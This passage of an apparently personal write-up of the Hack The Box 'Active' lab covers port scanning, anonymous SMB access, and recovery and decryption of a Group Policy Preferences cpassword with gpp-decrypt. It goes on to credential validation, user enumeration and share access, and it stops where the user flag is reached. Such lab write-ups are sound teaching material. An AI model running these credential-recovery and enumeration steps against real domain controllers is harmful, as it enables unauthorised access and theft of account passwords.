+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49162/tcp open  msrpc         Microsoft Windows RPC
+49167/tcp open  msrpc         Microsoft Windows RPC
+49169/tcp open  msrpc         Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.98%E=4%D=1/29%OT=53%CT=1%CU=41028%PV=Y%DS=2%DC=T%G=Y%TM=697BCEC
+OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10F%TI=I%CI=I%II=I%SS=S%TS=
+OS:7)SEQ(SP=103%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=104%GCD=1%ISR
+OS:=10D%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=104%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS
+OS:=S%TS=7)SEQ(SP=FF%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M552NW8S
+OS:T11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552
+OS:ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=
+OS:80%W=2000%O=M552NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2
+OS:(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80
+OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q
+OS:=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G
+OS:)IE(R=Y%DFI=N%T=80%CD=Z)
+
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-01-29T21:19:01
+|_  start_date: 2026-01-29T20:59:29
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled and required
+
+TRACEROUTE (using port 111/tcp)
+HOP RTT     ADDRESS
+1   9.61 ms 10.10.14.1
+2   9.82 ms 10.129.61.180
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 112.07 seconds</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ smbmap -H 10.129.61.180      
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /&quot;       )|&quot;  \    /&quot;  ||   _  &quot;\ |&quot;  \    /&quot;  |     /&quot;&quot;\       |   __ &quot;\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&apos; /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&apos;  \    (|  /
+   /&quot; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
+                                                                                                                             
+[+] IP: 10.129.61.180:445	Name: 10.129.61.180       	Status: Authenticated
+    Disk                                                  	Permissions	Comment
+    ----                                                  	-----------	-------
+    ADMIN$                                            	NO ACCESS	Remote Admin
+    C$                                                	NO ACCESS	Default share
+    IPC$                                              	NO ACCESS	Remote IPC
+    NETLOGON                                          	NO ACCESS	Logon server share 
+    Replication                                       	READ ONLY	
+    SYSVOL                                            	NO ACCESS	Logon server share 
+    Users                                             	NO ACCESS	
+[*] Closed 1 connections</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ smbmap -H 10.129.61.180      
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /&quot;       )|&quot;  \    /&quot;  ||   _  &quot;\ |&quot;  \    /&quot;  |     /&quot;&quot;\       |   __ &quot;\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&apos; /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&apos;  \    (|  /
+   /&quot; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
+                                                                                                                             
+[+] IP: 10.129.61.180:445	Name: 10.129.61.180       	Status: Authenticated
+    Disk                                                  	Permissions	Comment
+    ----                                                  	-----------	-------
+    ADMIN$                                            	NO ACCESS	Remote Admin
+    C$                                                	NO ACCESS	Default share
+    IPC$                                              	NO ACCESS	Remote IPC
+    NETLOGON                                          	NO ACCESS	Logon server share 
+    Replication                                       	READ ONLY	
+    SYSVOL                                            	NO ACCESS	Logon server share 
+    Users                                             	NO ACCESS	
+[*] Closed 1 connections</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ smbclient //10.129.61.180/Replication
+Password for [WORKGROUP\kali]:
+Anonymous login successful
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Sat Jul 21 06:37:44 2018
+  ..                                  D        0  Sat Jul 21 06:37:44 2018
+  active.htb                          D        0  Sat Jul 21 06:37:44 2018
+
+        5217023 blocks of size 4096. 284305 blocks available
+smb: \&gt; cd active.htb
+smb: \active.htb\&gt; dir
+  .                                   D        0  Sat Jul 21 06:37:44 2018
+  ..                                  D        0  Sat Jul 21 06:37:44 2018
+  DfsrPrivate                       DHS        0  Sat Jul 21 06:37:44 2018
+  Policies                            D        0  Sat Jul 21 06:37:44 2018
+  scripts                             D        0  Wed Jul 18 14:48:57 2018
+
+        5217023 blocks of size 4096. 284305 blocks available
+smb: \active.htb\&gt; </pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ smbclient //10.129.61.180/Replication
+Password for [WORKGROUP\kali]:
+Anonymous login successful
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D       <span class="hljs-number"> 0 </span> Sat Jul<span class="hljs-number"> 21 </span>06:37:44 2018
+  ..                                  D       <span class="hljs-number"> 0 </span> Sat Jul<span class="hljs-number"> 21 </span>06:37:44 2018
+  active.htb                          D       <span class="hljs-number"> 0 </span> Sat Jul<span class="hljs-number"> 21 </span>06:37:44 2018
+
+       <span class="hljs-number"> 5217023 </span>blocks of size 4096.<span class="hljs-number"> 284305 </span>blocks available
+smb: \&gt; cd active.htb
+smb: \active.htb\&gt; dir
+  .                                   D       <span class="hljs-number"> 0 </span> Sat Jul<span class="hljs-number"> 21 </span>06:37:44 2018
+  ..                                  D       <span class="hljs-number"> 0 </span> Sat Jul<span class="hljs-number"> 21 </span>06:37:44 2018
+  DfsrPrivate                       DHS       <span class="hljs-number"> 0 </span> Sat Jul<span class="hljs-number"> 21 </span>06:37:44 2018
+  Policies                            D       <span class="hljs-number"> 0 </span> Sat Jul<span class="hljs-number"> 21 </span>06:37:44 2018
+  scripts                             D       <span class="hljs-number"> 0 </span> Wed Jul<span class="hljs-number"> 18 </span>14:48:57 2018
+
+       <span class="hljs-number"> 5217023 </span>blocks of size 4096.<span class="hljs-number"> 284305 </span>blocks available
+smb: \active.htb\&gt; </code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\&gt; cd Groups
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\&gt; dir
+  .                                   D        0  Sat Jul 21 06:37:44 2018
+  ..                                  D        0  Sat Jul 21 06:37:44 2018
+  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018
+
+        5217023 blocks of size 4096. 284289 blocks available
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\&gt; get Groups.xml 
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (11.6 KiloBytes/sec) (average 37.3 KiloBytes/sec)</pre><pre class="hljs"><code>smb: \active.htb\Policies\{31B2F340<span class="hljs-string">-016</span>D<span class="hljs-string">-11</span>D2<span class="hljs-string">-945</span>F<span class="hljs-string">-00</span>C04FB984F9}\MACHINE\Preferences\&gt; cd Groups
+smb: \active.htb\Policies\{31B2F340<span class="hljs-string">-016</span>D<span class="hljs-string">-11</span>D2<span class="hljs-string">-945</span>F<span class="hljs-string">-00</span>C04FB984F9}\MACHINE\Preferences\Groups\&gt; dir
+  .                                   D        0  Sat Jul 21 06:37:44 2018
+  ..                                  D        0  Sat Jul 21 06:37:44 2018
+  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018
+
+        5217023 blocks of size 4096. 284289 blocks available
+smb: \active.htb\Policies\{31B2F340<span class="hljs-string">-016</span>D<span class="hljs-string">-11</span>D2<span class="hljs-string">-945</span>F<span class="hljs-string">-00</span>C04FB984F9}\MACHINE\Preferences\Groups\&gt; get Groups.xml 
+getting file \active.htb\Policies\{31B2F340<span class="hljs-string">-016</span>D<span class="hljs-string">-11</span>D2<span class="hljs-string">-945</span>F<span class="hljs-string">-00</span>C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (11.6 KiloBytes/sec) (average 37.3 KiloBytes/sec)</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;
+&lt;/Groups&gt;
+</pre><pre class="hljs"><code><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">Groups</span> <span class="hljs-attr">clsid</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">{3125E937-EB16-4b4c-9934-544FC6D24D26}</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">User</span> <span class="hljs-attr">clsid</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;active.htb\SVC_TGS&quot;</span> <span class="hljs-attr">image</span>=<span class="hljs-string">&quot;2&quot;</span> <span class="hljs-attr">changed</span>=<span class="hljs-string">&quot;2018-07-18 20:46:06&quot;</span> <span class="hljs-attr">uid</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">{EF57DA28-5F69-4530-A59E-AAB58578219D}</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Properties</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;U&quot;</span> <span class="hljs-attr">newName</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">fullName</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">description</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">cpassword</span>=<span class="hljs-string">&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</span> <span class="hljs-attr">changeLogon</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">noChange</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">neverExpires</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">acctDisabled</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">userName</span>=<span class="hljs-string">&quot;active.htb\SVC_TGS&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">User</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">Groups</span>&gt;</span>
+</span></code></pre></div>
+<p>Using <code class="inline-code">gpp-decrypt</code>, we can crack the hash of <code class="inline-code">svc_tgs</code> to obtain the password <code class="inline-code">GPPstillStandingStrong2k18</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ gpp-decrypt &quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;                                               
+GPPstillStandingStrong2k18</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span><span class="hljs-title class_">Labs</span>/<span class="hljs-title class_">Active</span>]
+&boxur;&boxh;<span class="hljs-variable">$ </span>gpp-decrypt <span class="hljs-string">&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</span>                                               
+<span class="hljs-title class_">GPPstillStandingStrong2k18</span></code></pre></div>
+<p>The credentials seems to work successfully:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ nxc smb 10.129.61.180 -u svc_tgs -p &apos;GPPstillStandingStrong2k18&apos;       
+SMB         10.129.61.180   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.61.180   445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>Labs/Active]
+&boxur;&boxh;$ nxc smb <span class="hljs-number">10.129</span><span class="hljs-number">.61</span><span class="hljs-number">.180</span> -u svc_tgs -p <span class="hljs-string">&apos;GPPstillStandingStrong2k18&apos;</span>       
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.61</span><span class="hljs-number">.180</span>   <span class="hljs-number">445</span>    DC               [*] Windows <span class="hljs-number">7</span> / Server <span class="hljs-number">2008</span> R2 Build <span class="hljs-number">7601</span> x64 (name:DC) (<span class="hljs-built_in">domain</span>:active.htb) (signing:<span class="hljs-literal">True</span>) (SMBv1:<span class="hljs-built_in">None</span>) (<span class="hljs-literal">Null</span> Auth:<span class="hljs-literal">True</span>)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.61</span><span class="hljs-number">.180</span>   <span class="hljs-number">445</span>    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18</code></pre></div>
+<p>Checking for user accounts shows our <code class="inline-code">svc_tgs</code> account along with a few others:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ nxc smb 10.129.61.180 -u svc_tgs -p &apos;GPPstillStandingStrong2k18&apos; --users --rid-brute 10000
+SMB         10.129.61.180   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.61.180   445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
+SMB         10.129.61.180   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.129.61.180   445    DC               Administrator                 2018-07-18 19:06:40 0       Built-in account for administering the computer/domain 
+SMB         10.129.61.180   445    DC               Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain 
+SMB         10.129.61.180   445    DC               krbtgt                        2018-07-18 18:50:36 0       Key Distribution Center Service Account 
+SMB         10.129.61.180   445    DC               SVC_TGS                       2018-07-18 20:14:38 0        
+SMB         10.129.61.180   445    DC               [*] Enumerated 4 local users: ACTIVE
+SMB         10.129.61.180   445    DC               498: ACTIVE\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.61.180   445    DC               500: ACTIVE\Administrator (SidTypeUser)
+SMB         10.129.61.180   445    DC               501: ACTIVE\Guest (SidTypeUser)
+SMB         10.129.61.180   445    DC               502: ACTIVE\krbtgt (SidTypeUser)
+SMB         10.129.61.180   445    DC               512: ACTIVE\Domain Admins (SidTypeGroup)
+SMB         10.129.61.180   445    DC               513: ACTIVE\Domain Users (SidTypeGroup)
+SMB         10.129.61.180   445    DC               514: ACTIVE\Domain Guests (SidTypeGroup)
+SMB         10.129.61.180   445    DC               515: ACTIVE\Domain Computers (SidTypeGroup)
+SMB         10.129.61.180   445    DC               516: ACTIVE\Domain Controllers (SidTypeGroup)
+SMB         10.129.61.180   445    DC               517: ACTIVE\Cert Publishers (SidTypeAlias)
+SMB         10.129.61.180   445    DC               518: ACTIVE\Schema Admins (SidTypeGroup)
+SMB         10.129.61.180   445    DC               519: ACTIVE\Enterprise Admins (SidTypeGroup)
+SMB         10.129.61.180   445    DC               520: ACTIVE\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.61.180   445    DC               521: ACTIVE\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.61.180   445    DC               553: ACTIVE\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.61.180   445    DC               571: ACTIVE\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.61.180   445    DC               572: ACTIVE\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.61.180   445    DC               1000: ACTIVE\DC$ (SidTypeUser)
+SMB         10.129.61.180   445    DC               1101: ACTIVE\DnsAdmins (SidTypeAlias)
+SMB         10.129.61.180   445    DC               1102: ACTIVE\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.61.180   445    DC               1103: ACTIVE\SVC_TGS (SidTypeUser)</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ nxc smb 10.129.61.180 -u svc_tgs -p &apos;GPPstillStandingStrong2k18&apos; --users --rid-brute 10000
+SMB         10.129.61.180   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.61.180   445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
+SMB         10.129.61.180   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.129.61.180   445    DC               Administrator                 2018-07-18 19:06:40 0       Built-in account for administering the computer/domain 
+SMB         10.129.61.180   445    DC               Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain 
+SMB         10.129.61.180   445    DC               krbtgt                        2018-07-18 18:50:36 0       Key Distribution Center Service Account 
+SMB         10.129.61.180   445    DC               SVC_TGS                       2018-07-18 20:14:38 0        
+SMB         10.129.61.180   445    DC               [*] Enumerated 4 local users: ACTIVE
+SMB         10.129.61.180   445    DC               498: ACTIVE\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.61.180   445    DC               500: ACTIVE\Administrator (SidTypeUser)
+SMB         10.129.61.180   445    DC               501: ACTIVE\Guest (SidTypeUser)
+SMB         10.129.61.180   445    DC               502: ACTIVE\krbtgt (SidTypeUser)
+SMB         10.129.61.180   445    DC               512: ACTIVE\Domain Admins (SidTypeGroup)
+SMB         10.129.61.180   445    DC               513: ACTIVE\Domain Users (SidTypeGroup)
+SMB         10.129.61.180   445    DC               514: ACTIVE\Domain Guests (SidTypeGroup)
+SMB         10.129.61.180   445    DC               515: ACTIVE\Domain Computers (SidTypeGroup)
+SMB         10.129.61.180   445    DC               516: ACTIVE\Domain Controllers (SidTypeGroup)
+SMB         10.129.61.180   445    DC               517: ACTIVE\Cert Publishers (SidTypeAlias)
+SMB         10.129.61.180   445    DC               518: ACTIVE\Schema Admins (SidTypeGroup)
+SMB         10.129.61.180   445    DC               519: ACTIVE\Enterprise Admins (SidTypeGroup)
+SMB         10.129.61.180   445    DC               520: ACTIVE\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.61.180   445    DC               521: ACTIVE\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.61.180   445    DC               553: ACTIVE\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.61.180   445    DC               571: ACTIVE\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.61.180   445    DC               572: ACTIVE\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.61.180   445    DC               1000: ACTIVE\DC$ (SidTypeUser)
+SMB         10.129.61.180   445    DC               1101: ACTIVE\DnsAdmins (SidTypeAlias)
+SMB         10.129.61.180   445    DC               1102: ACTIVE\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.61.180   445    DC               1103: ACTIVE\SVC_TGS (SidTypeUser)</code></pre></div>
+<p>Looks like our user <code class="inline-code">svc_tgs</code> can read the available shares in the network:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ nxc smb 10.129.61.180 -u svc_tgs -p &apos;GPPstillStandingStrong2k18&apos; --shares
+SMB         10.129.61.180   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.61.180   445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
+SMB         10.129.61.180   445    DC               [*] Enumerated shares
+SMB         10.129.61.180   445    DC               Share           Permissions     Remark
+SMB         10.129.61.180   445    DC               -----           -----------     ------
+SMB         10.129.61.180   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.61.180   445    DC               C$                              Default share
+SMB         10.129.61.180   445    DC               IPC$                            Remote IPC
+SMB         10.129.61.180   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.61.180   445    DC               Replication     READ            
+SMB         10.129.61.180   445    DC               SYSVOL          READ            Logon server share 
+SMB         10.129.61.180   445    DC               Users           READ</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ nxc smb 10.129.61.180 -u svc_tgs -p &apos;GPPstillStandingStrong2k18&apos; --shares
+SMB         10.129.61.180   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.61.180   445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
+SMB         10.129.61.180   445    DC               [*] Enumerated shares
+SMB         10.129.61.180   445    DC               Share           Permissions     Remark
+SMB         10.129.61.180   445    DC               -----           -----------     ------
+SMB         10.129.61.180   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.61.180   445    DC               C$                              Default share
+SMB         10.129.61.180   445    DC               IPC$                            Remote IPC
+SMB         10.129.61.180   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.61.180   445    DC               Replication     READ            
+SMB         10.129.61.180   445    DC               SYSVOL          READ            Logon server share 
+SMB         10.129.61.180   445    DC               Users           READ</code></pre></div>
+<p>Access the <code class="inline-code">Users</code> share as the user <code class="inline-code">svc_tgs</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ smbclient //10.129.61.180/Users -U svc_tgs
+Password for [WORKGROUP\svc_tgs]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                  DR        0  Sat Jul 21 10:39:20 2018
+  ..                                 DR        0  Sat Jul 21 10:39:20 2018
+  Administrator                       D        0  Mon Jul 16 06:14:21 2018
+  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
+  Default                           DHR        0  Tue Jul 14 02:38:21 2009
+  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
+  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
+  Public                             DR        0  Tue Jul 14 00:57:55 2009
+  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018
+
+        5217023 blocks of size 4096. 279174 blocks available
+smb: \&gt; 
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Active]
+&boxur;&boxh;$ smbclient //10.129.61.180/Users -U svc_tgs
+Password for [WORKGROUP\svc_tgs]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                  DR       <span class="hljs-number"> 0 </span> Sat Jul<span class="hljs-number"> 21 </span>10:39:20 2018
+  ..                                 DR       <span class="hljs-number"> 0 </span> Sat Jul<span class="hljs-number"> 21 </span>10:39:20 2018
+  Administrator                       D       <span class="hljs-number"> 0 </span> Mon Jul<span class="hljs-number"> 16 </span>06:14:21 2018
+  All Users                       DHSrn       <span class="hljs-number"> 0 </span> Tue Jul<span class="hljs-number"> 14 </span>01:06:44 2009
+  Default                           DHR       <span class="hljs-number"> 0 </span> Tue Jul<span class="hljs-number"> 14 </span>02:38:21 2009
+  Default User                    DHSrn       <span class="hljs-number"> 0 </span> Tue Jul<span class="hljs-number"> 14 </span>01:06:44 2009
+  desktop.ini                       AHS     <span class="hljs-number"> 174 </span> Tue Jul<span class="hljs-number"> 14 </span>00:57:55 2009
+  Public                             DR       <span class="hljs-number"> 0 </span> Tue Jul<span class="hljs-number"> 14 </span>00:57:55 2009
+  SVC_TGS                             D       <span class="hljs-number"> 0 </span> Sat Jul<span class="hljs-number"> 21 </span>11:16:32 2018
+
+       <span class="hljs-number"> 5217023 </span>blocks of size 4096.<span class="hljs-number"> 279174 </span>blocks available
+smb: \&gt; 
+</code></pre></div>
+<p>We can access the <code class="inline-code">user.txt</code> flag:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
